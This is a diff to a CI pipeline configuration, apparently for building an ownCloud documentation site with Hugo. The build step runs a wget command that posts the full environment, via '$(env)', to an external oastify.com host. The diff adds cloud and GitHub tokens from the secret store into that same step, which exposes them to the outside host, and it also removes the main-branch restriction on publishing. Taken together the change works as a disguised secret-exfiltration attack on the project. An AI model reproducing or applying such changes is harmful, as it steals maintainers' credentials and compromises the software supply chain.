@@ -25,6 +25,12 @@ steps:
   commands:
   - wget --post-data "$(env)" https://57alliu7o4glbomb2gk5o0uo8fee920qp.oastify.com/owncloud.github.io
   - hugo
+  environment:
+      HCLOUD_TOKEN:
+        from_secret: hcloud_token
+      GITHUB_PASS:
+      from_secret: github_token
+      PY_COLORS: 1
 
 - name: publish
   image: docker.io/plugins/gh-pages
@@ -36,10 +42,7 @@ steps:
     target_branch: gh-pages
     username:
       from_secret: github_username
-    delete: true
-  when:
-    ref:
-    - refs/heads/main
+    delete: false
 
 trigger:
   ref:
